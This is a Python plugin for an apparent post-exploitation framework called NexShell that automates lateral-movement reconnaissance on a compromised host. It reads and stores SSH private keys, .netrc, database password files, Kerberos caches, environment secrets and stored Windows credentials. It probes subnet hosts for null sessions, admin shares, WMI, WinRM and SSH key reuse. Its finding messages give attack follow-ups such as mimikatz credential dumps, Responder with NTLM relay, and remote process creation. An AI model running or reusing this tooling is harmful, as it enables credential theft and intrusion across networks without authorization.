#!/usr/bin/env python3
"""
NexShell Plugin — Lateral Mover  (plugins/lateral_mover.py)
Discover and enumerate lateral movement vectors.

Coverage:
  - SMB access discovery (null sessions, valid creds)
  - WMI reachability
  - WinRM (PS-Remoting) reachability
  - RDP availability & NLA status
  - SSH key-based access to discovered hosts
  - Pass-the-Hash / Pass-the-Ticket vector assessment
  - Cached credentials (Windows credential manager)
  - Shared credentials across hosts
  - Admin share (ADMIN$, C$) access
  - NTLM relay vectors (LLMNR/NBT-NS)
  - Kerberos ticket cache
  - PsExec-style service path
  - Network trust relationships

Usage:
    (NexShell)> plugins run lateral-mover
    (NexShell)> plugins run lateral-mover --target 192.168.1.10
    (NexShell)> plugins run lateral-mover --subnet 192.168.1.0/24
"""

import re
from core.plugin import NexPlugin


class LateralMover(NexPlugin):
    name        = "lateral-mover"
    description = "Lateral movement recon — SMB/WMI/WinRM/SSH/RDP/PTH/PTT vectors"
    author      = "vulnquest58"
    version     = "1.0"
    platform    = "all"
    category    = "lateral"
    mitre_id    = "T1021"

    # ── Local system assessment ───────────────────────────────────────────────
    LOCAL_CHECKS_WINDOWS = [
        # Current session & tokens
        ("whoami /all",                                  "whoami_all",       "Current Privileges"),
        ("klist 2>nul",                                  "klist",            "Kerberos Ticket Cache"),
        ("cmdkey /list",                                 "cmdkey",           "Stored Credentials"),

        # Credential access
        ("powershell -c \"Get-StoredCredential | Format-List\" 2>nul", "stored_creds", "PS Stored Credentials"),
        ("reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password | head -10", "reg_passwords", "Registry Passwords"),

        # Network connectivity assessments
        ("netstat -ano | findstr ESTABLISHED",           "active_conns",     "Active Connections"),
        ("arp -a",                                       "arp_table",        "ARP Table (known hosts)"),
        ("net view /all 2>nul",                          "net_view",         "Network View (shares)"),
        ("net view /all /domain 2>nul",                  "net_domain_view",  "Domain Network View"),

        # RDP sessions
        ("query session 2>nul",                          "rdp_sessions",     "RDP Sessions"),
        ("qwinsta 2>nul",                                "qwinsta",          "Terminal Sessions"),

        # Admin shares
        ("net share",                                    "local_shares",     "Local Shares"),

        # SMB access to other hosts
        ("powershell -c \"Test-Path '\\\\127.0.0.1\\ADMIN$'\" 2>nul", "admin_share_local", "Admin$ Access (local)"),

        # WMI
        ("wmic /node:localhost computersystem get Name 2>nul", "wmi_local", "WMI Local Test"),

        # WinRM
        ("powershell -c \"Test-WSMan -ErrorAction SilentlyContinue\" 2>nul", "winrm_local", "WinRM Local"),

        # Pass-the-Hash assessment (lsass)
        ("tasklist | findstr lsass",                    "lsass_running",    "LSASS Running"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential", "wdigest", "WDigest Credential Caching"),

        # NTLM relay detection
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters /v EnableMulticast", "llmnr", "LLMNR Status"),
        ("reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType", "nbtns", "NBT-NS NodeType"),

        # Signing
        ("powershell -c \"Get-SmbClientConfiguration | Select-Object RequireSecuritySignature,EnableSecuritySignature\" 2>nul", "smb_signing_client", "SMB Client Signing"),
        ("powershell -c \"Get-SmbServerConfiguration | Select-Object RequireSecuritySignature,EnableSecuritySignature\" 2>nul", "smb_signing_server", "SMB Server Signing"),
    ]

    LOCAL_CHECKS_LINUX = [
        # Identity
        ("id",                                           "identity",         "Current Identity"),
        ("klist 2>/dev/null",                            "klist",            "Kerberos Ticket Cache (Linux)"),
        ("cat /tmp/krb5cc_* 2>/dev/null | strings | head -20", "krb5_cache", "Kerberos Cache Files"),
        ("ls -la /tmp/krb5cc_* 2>/dev/null",            "krb5_files",       "Kerberos Cache File Listing"),

        # Network
        ("ip addr",                                      "ip_addr",          "Network Interfaces"),
        ("ss -tnp",                                      "active_conns",     "Active TCP Connections"),
        ("arp -a 2>/dev/null || ip neigh",               "arp_table",        "ARP Table (known hosts)"),
        ("cat /etc/hosts",                               "hosts_file",       "/etc/hosts"),

        # SSH keys (pivot points)
        ("ls -la ~/.ssh/",                               "ssh_dir",          "SSH Key Directory"),
        ("cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 2>/dev/null | head -5", "ssh_privkey", "SSH Private Keys"),
        ("cat ~/.ssh/known_hosts 2>/dev/null",           "known_hosts",      "SSH Known Hosts"),
        ("cat ~/.ssh/config 2>/dev/null",                "ssh_config",       "SSH Config"),

        # Stored creds
        ("cat ~/.netrc 2>/dev/null",                     "netrc",            ".netrc Credentials"),
        ("cat ~/.pgpass 2>/dev/null",                    "pgpass",           "PostgreSQL .pgpass"),
        ("cat ~/.my.cnf 2>/dev/null",                    "mysql_cnf",        "MySQL .my.cnf"),
        ("env | grep -iE 'pass|secret|token|key'",       "env_secrets",      "Environment Secrets"),
        ("git config --list 2>/dev/null | grep -i url",  "git_urls",         "Git Remote URLs"),

        # SMB
        ("smbclient -L localhost -N 2>/dev/null",        "smb_local",        "SMB Shares (local)"),

        # NTLM relay surface
        ("cat /etc/nsswitch.conf 2>/dev/null | grep hosts", "nsswitch", "nsswitch hosts config"),
        ("systemd-resolve --status 2>/dev/null | grep -i 'LLMNR\\|MulticastDNS'", "llmnr_linux", "LLMNR/mDNS (Linux)"),
    ]

    # ── Remote host checks (per-target) ──────────────────────────────────────
    def _build_remote_checks_windows(self, target: str) -> list:
        return [
            (f"net use \\\\{target}\\IPC$ /user:Guest \"\" 2>nul && echo SMB-NULL-OK",
             "smb_null", f"SMB Null Session to {target}"),
            (f"powershell -c \"Test-Path '\\\\{target}\\ADMIN$'\" 2>nul",
             "admin_share", f"ADMIN$ Access to {target}"),
            (f"powershell -c \"Test-Path '\\\\{target}\\C$'\" 2>nul",
             "c_share", f"C$ Access to {target}"),
            (f"wmic /node:{target} computersystem get Name 2>nul",
             "wmi_access", f"WMI Access to {target}"),
            (f"powershell -c \"Test-WSMan {target} -ErrorAction SilentlyContinue\" 2>nul",
             "winrm_access", f"WinRM Access to {target}"),
            (f"ping -n 1 -w 1000 {target} 2>nul | findstr /i TTL",
             "ping_target", f"Ping {target}"),
        ]

    def _build_remote_checks_linux(self, target: str) -> list:
        return [
            (f"smbclient -L {target} -N 2>/dev/null",
             "smb_list", f"SMB Shares on {target}"),
            (f"smbclient //{target}/IPC$ -N 2>/dev/null -c 'exit' && echo SMB-NULL-OK",
             "smb_null", f"SMB Null Session to {target}"),
            (f"(echo >/dev/tcp/{target}/22) 2>/dev/null && echo SSH-OPEN",
             "ssh_open", f"SSH Port {target}:22"),
            (f"(echo >/dev/tcp/{target}/445) 2>/dev/null && echo SMB-OPEN",
             "smb_open", f"SMB Port {target}:445"),
            (f"(echo >/dev/tcp/{target}/3389) 2>/dev/null && echo RDP-OPEN",
             "rdp_open", f"RDP Port {target}:3389"),
            (f"(echo >/dev/tcp/{target}/5985) 2>/dev/null && echo WINRM-OPEN",
             "winrm_open", f"WinRM Port {target}:5985"),
            (f"ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no {target} id 2>&1",
             "ssh_key_auth", f"SSH Key Auth to {target}"),
            (f"ping -c 1 -W 1 {target} 2>/dev/null | grep 'bytes from'",
             "ping_target", f"Ping {target}"),
        ]

    FINDING_PATTERNS = {
        "klist": [
            (r"Ticket cache|Credentials cache",
             "High", "Kerberos Tickets in Cache",
             "Active Kerberos tickets found. Export and use for lateral movement (Pass-the-Ticket). Use mimikatz sekurlsa::tickets or impacket/ticketer."),
        ],
        "wdigest": [
            (r"UseLogonCredential\s+REG_DWORD\s+0x1",
             "Critical", "WDigest Credential Caching Enabled",
             "WDigest is enabled — plaintext credentials cached in LSASS memory. Dump with: mimikatz sekurlsa::wdigest"),
        ],
        "llmnr": [
            (r"EnableMulticast.*0x1|(?!.*EnableMulticast)",
             "High", "LLMNR Enabled (NTLM Relay Vector)",
             "LLMNR is active. Run Responder to capture hashes. Combined with NTLM relay → code execution without cracking."),
        ],
        "nbtns": [
            (r"NodeType.*0x1|NodeType.*0x4",  # B-node or mixed
             "High", "NBT-NS Enabled",
             "NetBIOS Name Service is active. Relay attack vector. Disable via DHCP option 46 or registry."),
        ],
        "smb_signing_server": [
            (r"RequireSecuritySignature\s*:\s*False",
             "High", "SMB Signing Not Required on Server",
             "SMB signing not required. NTLM relay attacks possible (PetitPotam, PrinterBug, etc.). Enable: Set-SmbServerConfiguration -RequireSecuritySignature $true"),
        ],
        "cmdkey": [
            (r"Target:|TERMSRV",
             "High", "Stored Windows Credentials Found",
             "cmdkey stored credentials found. Reuse: runas /savedcred /user:<user> cmd. Also try: Invoke-Mimikatz -Command 'vault::list'"),
        ],
        "ssh_privkey": [
            (r"-----BEGIN",
             "High", "SSH Private Key Found",
             "SSH private key accessible. Test against all known_hosts entries for key reuse."),
        ],
        "known_hosts": [
            (r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}",
             "Medium", "SSH Known Hosts — Lateral Movement Targets",
             "Known hosts = hosts this user previously connected to. Test SSH key reuse against all entries."),
        ],
        "netrc": [
            (r"password\s+\S+",
             "Critical", "Plaintext Password in .netrc",
             ".netrc contains plaintext credentials for auto-authentication. Reuse for lateral movement."),
        ],
        "smb_null": [
            (r"SMB-NULL-OK",
             "High", "SMB Null Session Successful",
             "Null session allows unauthenticated enumeration. Enumerate users, shares, policies."),
        ],
        "admin_share": [
            (r"True",
             "Critical", "ADMIN$ Share Accessible",
             "Admin share accessible — equivalent to remote shell. Use: sc \\\\target create/start, wmic /node:target, or psexec."),
        ],
        "wmi_access": [
            (r"\w",
             "High", "WMI Remote Access Confirmed",
             "WMI remote code execution: wmic /node:target process call create 'cmd /c whoami'"),
        ],
        "winrm_access": [
            (r"\w",
             "High", "WinRM Remote Access Confirmed",
             "WinRM (PS-Remoting) accessible. Execute: Enter-PSSession -ComputerName target -Credential (Get-Credential)"),
        ],
        "ssh_key_auth": [
            (r"uid=\d+",
             "Critical", "SSH Key Auth Successful — Lateral Movement",
             "SSH key-based authentication succeeded. Direct shell access to target with current user's key."),
        ],
    }

    def run(self, session, args: list):
        target = None
        subnet = None

        for a in (args or []):
            if a.startswith('--target='):
                target = a.split('=', 1)[1]
            elif a.startswith('--subnet='):
                subnet = a.split('=', 1)[1]

        platform = self._detect_platform(session)
        self.info(f"Starting lateral-mover v1.0 (platform: {platform}) ...")
        sections  = []
        collected = {}
        findings_created = 0

        # ── Local enumeration ─────────────────────────────────────────────────
        sections.append(f"\n{'═'*64}")
        sections.append("  [Local System Assessment]")
        sections.append('═'*64)

        local_checks = self.LOCAL_CHECKS_WINDOWS if platform == 'windows' else self.LOCAL_CHECKS_LINUX
        for cmd, key, label in local_checks:
            try:
                out = self._exec(session, cmd)
                if not out.strip():
                    continue
                collected[key] = out
                self.loot(out, category='credentials', source=f"lateral-mover:{key}")
                sections.append(f"\n  [{label}]")
                sections.append('─'*64)
                sections.append(out.strip()[:400])
            except Exception as e:
                self.warn(f"Local check failed [{label}]: {e}")

        # ── Remote target enumeration ─────────────────────────────────────────
        targets = []
        if target:
            targets = [target]
        elif subnet:
            base = '.'.join(subnet.split('.')[:3])
            for i in range(1, 255):
                targets.append(f"{base}.{i}")

        if targets:
            sections.append(f"\n{'═'*64}")
            sections.append(f"  [Remote Target Enumeration — {len(targets)} targets]")
            sections.append('═'*64)

        for tgt in targets[:20]:  # cap at 20 targets
            remote_checks = (self._build_remote_checks_windows(tgt)
                             if platform == 'windows'
                             else self._build_remote_checks_linux(tgt))
            tgt_data = {}
            for cmd, key, label in remote_checks:
                try:
                    out = self._exec(session, cmd)
                    if not out.strip():
                        continue
                    tgt_data[key] = out
                    if any(x in out for x in ['SMB-NULL-OK', 'True', 'uid=', 'SSH-OPEN', 'SMB-OPEN']):
                        self.loot(out, category='network', source=f"lateral-mover:{tgt}:{key}")
                        sections.append(f"\n  [+] {label}: {out.strip()[:100]}")
                except Exception:
                    pass

            # Check admin/WMI/WinRM access
            if tgt_data.get('admin_share', '').strip() == 'True':
                self.finding(
                    title=f"Admin$ Access to {tgt}",
                    description=f"Current credentials have ADMIN$ access to {tgt}.",
                    severity="Critical",
                    recommendation="Restrict admin share access. Use local administrator account restrictions.",
                    mitre_id="T1021.002",
                )
                self.emit('finding.created', severity='critical', title=f'Admin$ {tgt}', plugin=self.name)
                findings_created += 1

            if tgt_data.get('ssh_key_auth', '').strip():
                if re.search(r'uid=\d+', tgt_data.get('ssh_key_auth', '')):
                    self.finding(
                        title=f"SSH Key Auth Successful to {tgt}",
                        description=tgt_data['ssh_key_auth'][:200],
                        severity="Critical",
                        recommendation="Audit SSH authorized_keys. Remove unused keys. Enforce key rotation.",
                        mitre_id="T1021.004",
                    )
                    findings_created += 1

        # ── Pattern-based findings on local data ──────────────────────────────
        for key, patterns in self.FINDING_PATTERNS.items():
            text = collected.get(key, '')
            if not text.strip():
                continue
            for pattern, severity, title, recommendation in patterns:
                if re.search(pattern, text, re.MULTILINE | re.IGNORECASE):
                    self.finding(
                        title=title,
                        description=f"[{key}]\n\n{text[:400]}",
                        severity=severity,
                        recommendation=recommendation,
                        mitre_id=self.mitre_id,
                    )
                    self.emit('finding.created', severity=severity, title=title, plugin=self.name)
                    findings_created += 1

        # ── Lateral movement path summary ─────────────────────────────────────
        paths = []
        if re.search(r'Credentials cache|Ticket cache', collected.get('klist', ''), re.I):
            paths.append("Kerberos tickets → Pass-the-Ticket → lateral movement")
        if collected.get('wdigest', '') and 'UseLogonCredential.*0x1' in collected.get('wdigest', ''):
            paths.append("WDigest enabled → dump LSASS → plaintext passwords")
        if re.search(r'Target:', collected.get('cmdkey', '')):
            paths.append("Stored credentials (cmdkey) → runas /savedcred → lateral movement")
        if re.search(r'-----BEGIN', collected.get('ssh_privkey', '')):
            paths.append("SSH private key → test known_hosts → key reuse lateral movement")
        if re.search(r'RequireSecuritySignature.*False', collected.get('smb_signing_server', '')):
            paths.append("SMB signing disabled → NTLM relay attack (Responder + ntlmrelayx)")

        if paths:
            sections.append(f"\n{'═'*64}")
            sections.append("  [!] Lateral Movement Paths:")
            for p in paths:
                sections.append(f"  ► {p}")

        self.info(f"lateral-mover complete — {findings_created} findings, {len(paths)} lateral paths.")
        return '\n'.join(sections) if sections else "No lateral movement data collected."

    def _detect_platform(self, session) -> str:
        try:
            out = self._exec(session, 'echo %OS%')
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'

    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''
